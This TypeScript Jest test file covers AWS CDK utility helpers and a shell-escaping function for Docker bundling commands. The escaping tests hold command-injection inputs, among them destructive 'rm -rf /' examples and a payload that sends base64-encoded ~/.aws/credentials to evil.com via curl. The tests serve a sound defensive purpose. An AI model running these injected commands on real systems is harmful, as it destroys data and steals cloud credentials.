import * as child_process from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import { bockfs } from '@aws-cdk/cdk-build-tools';
import { callsites, exec, extractDependencies, findUp, findUpMultiple, getTsconfigCompilerOptions } from '../lib/util';

beforeEach(() => {
  jest.clearAllMocks();
});

describe('callsites', () => {
  expect(callsites()[0].getFileName()).toMatch(/\/test\/util.test.ts$/);
});

describe('findUp helpers', () => {
  // insert contents in fake filesystem
  bockfs({
    '/home/project/file0': 'ARBITRARY',
    '/home/project/file1': 'ARBITRARY',
    '/home/project/file2': 'ARBITRARY',
    '/home/project/subdir/.keep': 'ARBITRARY',
    '/home/project/subdir/file3': 'ARBITRARY',
  });
  const bockPath = bockfs.workingDirectory('/home/project');

  afterAll(() => {
    bockfs.restore();
  });

  describe('findUp', () => {
    test('Starting at process.cwd()', () => {
      expect(findUp('file0')).toBe(bockPath`file0`);
    });

    test('Non existing file', () => {
      expect(findUp('non-existing-file.unknown')).toBe(undefined);
    });

    test('Starting at a specific path', () => {
      expect(findUp('file1', bockPath`/home/project/subdir`)).toBe(bockPath`/home/project/file1`);
    });

    test('Non existing file starting at a non existing relative path', () => {
      expect(findUp('not-to-be-found.txt', 'non-existing/relative/path')).toBe(undefined);
    });

    test('Starting at a relative path', () => {
      expect(findUp('file1', 'subdir')).toBe(bockPath`file1`);
    });
  });

  describe('findUpMultiple', () => {
    test('Starting at process.cwd()', () => {
      const files = findUpMultiple(['file0', 'file1']);
      expect(files).toHaveLength(2);
      expect(files[0]).toBe(bockPath`file0`);
      expect(files[1]).toBe(bockPath`file1`);
    });

    test('Non existing files', () => {
      expect(findUpMultiple(['non-existing-file.unknown', 'non-existing-file.unknown2'])).toEqual([]);
    });

    test('Existing and non existing files', () => {
      const files = findUpMultiple(['non-existing-file.unknown', 'file0']);
      expect(files).toHaveLength(1);
      expect(files[0]).toMatch(bockPath`file0`);
    });

    test('Starting at a specific path', () => {
      const files = findUpMultiple(['file1', 'file2'], bockPath`/home/project/subdir`);
      expect(files).toHaveLength(2);
      expect(files[0]).toBe(bockPath`file1`);
      expect(files[1]).toBe(bockPath`file2`);
    });

    test('Non existing files starting at a non existing relative path', () => {
      expect(findUpMultiple(['not-to-be-found.txt', 'not-to-be-found2.txt'], 'non-existing/relative/path')).toEqual([]);
    });

    test('Starting at a relative path', () => {
      const files = findUpMultiple(['file1', 'file2'], 'subdir');
      expect(files).toHaveLength(2);
      expect(files[0]).toBe(bockPath`file1`);
      expect(files[1]).toBe(bockPath`file2`);
    });

    test('Files on multiple levels', () => {
      const files = findUpMultiple(['file0', 'file3'], bockPath`/home/project/subdir`);
      expect(files).toHaveLength(1);
      expect(files[0]).toBe(bockPath`subdir/file3`);
    });
  });
});

describe('exec', () => {
  test('normal execution', () => {
    const spawnSyncMock = jest.spyOn(child_process, 'spawnSync').mockReturnValue({
      status: 0,
      stderr: Buffer.from('stderr'),
      stdout: Buffer.from('stdout'),
      pid: 123,
      output: ['stdout', 'stderr'],
      signal: null,
    });

    const proc = exec(
      'cmd',
      ['arg1', 'arg2'],
      { env: { KEY: 'value' } },
    );

    expect(spawnSyncMock).toHaveBeenCalledWith(
      'cmd',
      ['arg1', 'arg2'],
      { env: { KEY: 'value' } },
    );
    expect(proc.stdout.toString()).toBe('stdout');

    spawnSyncMock.mockRestore();
  });

  test('non zero status', () => {
    const spawnSyncMock = jest.spyOn(child_process, 'spawnSync').mockReturnValue({
      status: 999,
      stderr: Buffer.from('error occurred'),
      stdout: Buffer.from('stdout'),
      pid: 123,
      output: ['stdout', 'stderr'],
      signal: null,
    });

    expect(() => exec('cmd', ['arg1', 'arg2'])).toThrow('error occurred');

    spawnSyncMock.mockRestore();
  });

  test('with error', () => {
    const spawnSyncMock = jest.spyOn(child_process, 'spawnSync').mockReturnValue({
      error: new Error('bad error'),
      status: 0,
      stderr: Buffer.from('stderr'),
      stdout: Buffer.from('stdout'),
      pid: 123,
      output: ['stdout', 'stderr'],
      signal: null,
    });

    expect(() => exec('cmd', ['arg1', 'arg2'])).toThrow(new Error('bad error'));

    spawnSyncMock.mockRestore();
  });
});

describe('extractDependencies', () => {
  test('with dependencies referenced in package.json', () => {
    const deps = extractDependencies(
      path.join(__dirname, 'testpackage.json'),
      ['@aws-cdk/aws-lambda', '@aws-cdk/core'],
    );
    expect(Object.keys(deps)).toEqual([
      '@aws-cdk/aws-lambda',
      '@aws-cdk/core',
    ]);
  });

  test('with transitive dependencies', () => {
    expect(extractDependencies(
      path.join(__dirname, 'testpackage.json'),
      ['typescript'],
    )).toEqual({
      // eslint-disable-next-line @typescript-eslint/no-require-imports
      typescript: require('typescript/package.json').version,
    });
  });

  test('with unknown dependency', () => {
    expect(() => extractDependencies(
      path.join(__dirname, 'testpackage.json'),
      ['unknown'],
    )).toThrow(/Cannot extract version for module 'unknown'/);
  });

  test('with file dependency', () => {
    const pkgPath = path.join(__dirname, 'package-file.json');
    fs.writeFileSync(pkgPath, JSON.stringify({
      dependencies: {
        'my-module': 'file:../../core',
      },
    }));

    expect(extractDependencies(pkgPath, ['my-module'])).toEqual({
      'my-module': expect.stringMatching(/packages\/aws-cdk-lib\/core/),
    });

    fs.unlinkSync(pkgPath);
  });
});

describe('getTsconfigCompilerOptions', () => {
  test('should extract compiler options and returns as string', () => {
    const tsconfig = path.join(__dirname, 'testtsconfig.json');
    const compilerOptions = getTsconfigCompilerOptions(tsconfig);
    expect(compilerOptions).toEqual([
      '--alwaysStrict',
      '--declaration',
      '--declarationMap false',
      '--experimentalDecorators',
      '--incremental false',
      '--inlineSourceMap',
      '--inlineSources',
      '--lib es2022,dom',
      '--module CommonJS',
      '--newLine lf',
      '--noEmitOnError',
      '--noFallthroughCasesInSwitch',
      '--noImplicitAny',
      '--noImplicitReturns',
      '--noImplicitThis',
      '--noUnusedLocals',
      '--noUnusedParameters',
      '--outDir ./',
      '--resolveJsonModule',
      '--rootDir ./',
      '--strict',
      '--strictNullChecks',
      '--strictPropertyInitialization',
      '--stripInternal false',
      '--target ES2022',
    ].join(' '));
  });

  test('should extract compiler options with extended config overriding', () => {
    const tsconfig = path.join(__dirname, 'testtsconfig-extended.json');
    const compilerOptions = getTsconfigCompilerOptions(tsconfig);
    expect(compilerOptions).toEqual([
      '--alwaysStrict',
      '--declaration',
      '--declarationMap false',
      '--experimentalDecorators',
      '--incremental false',
      '--inlineSourceMap',
      '--inlineSources',
      '--lib es2022,dom',
      '--module CommonJS',
      '--newLine lf',
      '--noEmitOnError',
      '--noFallthroughCasesInSwitch',
      '--noImplicitAny',
      '--noImplicitReturns',
      '--noImplicitThis',
      '--noUnusedLocals',
      '--noUnusedParameters',
      '--outDir ./',
      '--resolveJsonModule',
      '--rootDir ./',
      '--strict',
      '--strictNullChecks',
      '--strictPropertyInitialization',
      '--stripInternal false',
      '--target ES2022',
    ].join(' '));
  });
});


/**
 * =============================================================================
 * SHELL ESCAPE UTILITY TESTS
 * =============================================================================
 *
 * These tests verify that the shellEscapeForBundlingCommand() function correctly
 * escapes shell metacharacters for safe interpolation into shell command strings.
 *
 * This function is used to ensure proper quoting in the Docker bundling path
 * where we must produce a shell command string.
 *
 * ESCAPING STRATEGY:
 * - POSIX (Linux/macOS): Wrap value in single quotes, escape embedded single quotes as '\''
 * - Windows: Wrap value in double quotes, escape ", %, and ! characters
 */
describe('shellEscapeForBundlingCommand', () => {
  // Import will fail until we implement the function
  let shellEscapeForBundlingCommand: (value: string, platform: NodeJS.Platform) => string;

  beforeAll(() => {
    // Dynamic import to allow tests to be written before implementation
    try {
      shellEscapeForBundlingCommand = require('../lib/util').shellEscapeForBundlingCommand;
    } catch (e) {
      // Function not yet implemented - tests will fail as expected
    }
  });

  describe('POSIX shell escaping (Linux/macOS)', () => {
    const platform: NodeJS.Platform = 'linux';

    test('escapes ampersand (&) - command separator', () => {
      /**
       * & in shell executes the preceding command in background and runs the next command.
       * Example: `foo & rm -rf /` would run two separate commands.
       */
      const result = shellEscapeForBundlingCommand('foo & echo PWNED', platform);
      expect(result).toBe("'foo & echo PWNED'");
    });

    test('escapes semicolon (;) - command separator', () => {
      /**
       * ; in shell separates commands to run sequentially.
       * Example: `foo; rm -rf /` would run two commands sequentially.
       */
      const result = shellEscapeForBundlingCommand('foo; echo PWNED', platform);
      expect(result).toBe("'foo; echo PWNED'");
    });

    test('escapes pipe (|) - command chaining', () => {
      /**
       * | pipes stdout of one command to stdin of another.
       * Example: `foo | other-command` would pipe output unexpectedly.
       */
      const result = shellEscapeForBundlingCommand('foo | cat /etc/passwd', platform);
      expect(result).toBe("'foo | cat /etc/passwd'");
    });

    test('escapes command substitution $(...)', () => {
      /**
       * $(...) executes the enclosed command and substitutes its output.
       * Example: `$(curl evil.com/script | bash)` would execute the substituted command.
       */
      const result = shellEscapeForBundlingCommand('$(echo PWNED)', platform);
      expect(result).toBe("'$(echo PWNED)'");
    });

    test('escapes backtick command substitution', () => {
      /**
       * `...` is the legacy syntax for command substitution.
       * Example: `\`curl evil.com\`` would execute the enclosed command.
       */
      const result = shellEscapeForBundlingCommand('`echo PWNED`', platform);
      expect(result).toBe("'`echo PWNED`'");
    });

    test('escapes output redirection (>)', () => {
      /**
       * > redirects stdout to a file, potentially overwriting important files.
       * Example: `foo > /etc/passwd` could overwrite system files.
       */
      const result = shellEscapeForBundlingCommand('foo > /tmp/pwned', platform);
      expect(result).toBe("'foo > /tmp/pwned'");
    });

    test('escapes input redirection (<)', () => {
      /**
       * < redirects file content to stdin.
       * Example: `command < /etc/shadow` could read sensitive files.
       */
      const result = shellEscapeForBundlingCommand('foo < /etc/passwd', platform);
      expect(result).toBe("'foo < /etc/passwd'");
    });

    test('escapes newline characters', () => {
      /**
       * Newlines can be used to run additional commands on separate lines.
       * Example: "foo\nrm -rf /" would run rm on a new line.
       */
      const result = shellEscapeForBundlingCommand('foo\necho PWNED', platform);
      expect(result).toBe("'foo\necho PWNED'");
    });

    test('escapes embedded single quotes', () => {
      /**
       * Single quotes within a single-quoted string must be escaped specially.
       * The pattern '\'' ends the quote, adds an escaped quote, and reopens.
       */
      const result = shellEscapeForBundlingCommand("foo'bar", platform);
      expect(result).toBe("'foo'\\''bar'");
    });

    test('handles double quotes (no special escaping needed in single quotes)', () => {
      /**
       * Double quotes inside single quotes are literal - no escaping needed.
       */
      const result = shellEscapeForBundlingCommand('foo"bar', platform);
      expect(result).toBe("'foo\"bar'");
    });

    test('handles spaces (preserved in single quotes)', () => {
      /**
       * Spaces are preserved literally inside single quotes.
       */
      const result = shellEscapeForBundlingCommand('foo bar baz', platform);
      expect(result).toBe("'foo bar baz'");
    });

    test('handles clean values (still quoted for safety)', () => {
      /**
       * Even clean values are quoted to ensure consistent behavior
       * and protect against edge cases.
       */
      const result = shellEscapeForBundlingCommand('clean-value', platform);
      expect(result).toBe("'clean-value'");
    });

    test('handles empty string', () => {
      const result = shellEscapeForBundlingCommand('', platform);
      expect(result).toBe("''");
    });

    test('handles complex payload with multiple metacharacters', () => {
      /**
       * Complex payload combining multiple shell metacharacters.
       * Input: '; curl https://evil.com/exfil?data=$(cat ~/.aws/credentials | base64) #
       * The leading ' gets escaped as '\'' (end-quote, escaped-quote, start-quote)
       * Result: '' + \' + '' + rest of string + closing '
       */
      const payload = "'; curl https://evil.com/exfil?data=$(cat ~/.aws/credentials | base64) #";
      const result = shellEscapeForBundlingCommand(payload, platform);
      // In JS string literal: ''\\''; ... means the actual string is: ''\'; ...
      expect(result).toBe("''\\''; curl https://evil.com/exfil?data=$(cat ~/.aws/credentials | base64) #'");
    });
  });

  describe('Windows cmd.exe escaping', () => {
    const platform: NodeJS.Platform = 'win32';

    test('escapes ampersand (&) - command separator', () => {
      /**
       * & in cmd.exe runs multiple commands.
       * Example: `foo & del /f /s /q C:\` would run two separate commands.
       */
      const result = shellEscapeForBundlingCommand('foo & echo PWNED', platform);
      expect(result).toBe('"foo & echo PWNED"');
    });

    test('escapes pipe (|) - command chaining', () => {
      const result = shellEscapeForBundlingCommand('foo | type C:\\secrets.txt', platform);
      expect(result).toBe('"foo | type C:\\secrets.txt"');
    });

    test('escapes output redirection (>)', () => {
      const result = shellEscapeForBundlingCommand('foo > C:\\pwned.txt', platform);
      expect(result).toBe('"foo > C:\\pwned.txt"');
    });

    test('escapes embedded double quotes', () => {
      /**
       * Double quotes inside double-quoted strings must be escaped.
       * In cmd.exe, we escape " as ""
       */
      const result = shellEscapeForBundlingCommand('foo"bar', platform);
      expect(result).toBe('"foo""bar"');
    });

    test('escapes percent signs (%) - variable expansion', () => {
      /**
       * % is used for environment variable expansion in cmd.exe.
       * Example: `%USERPROFILE%` would expand to user's home directory.
       * We escape % as %% in cmd.exe.
       */
      const result = shellEscapeForBundlingCommand('foo%PATH%bar', platform);
      expect(result).toBe('"foo%%PATH%%bar"');
    });

    test('escapes exclamation marks (!) - delayed expansion', () => {
      /**
       * ! is used for delayed variable expansion in cmd.exe when enabled.
       * We escape ! as ^! in cmd.exe.
       */
      const result = shellEscapeForBundlingCommand('foo!bar!', platform);
      expect(result).toBe('"foo^!bar^!"');
    });

    test('handles clean values (still quoted for safety)', () => {
      const result = shellEscapeForBundlingCommand('clean-value', platform);
      expect(result).toBe('"clean-value"');
    });
  });

  describe('platform detection', () => {
    test('darwin uses POSIX escaping', () => {
      const result = shellEscapeForBundlingCommand('foo & bar', 'darwin');
      expect(result).toBe("'foo & bar'");
    });

    test('linux uses POSIX escaping', () => {
      const result = shellEscapeForBundlingCommand('foo & bar', 'linux');
      expect(result).toBe("'foo & bar'");
    });

    test('win32 uses Windows escaping', () => {
      const result = shellEscapeForBundlingCommand('foo & bar', 'win32');
      expect(result).toBe('"foo & bar"');
    });
  });
});
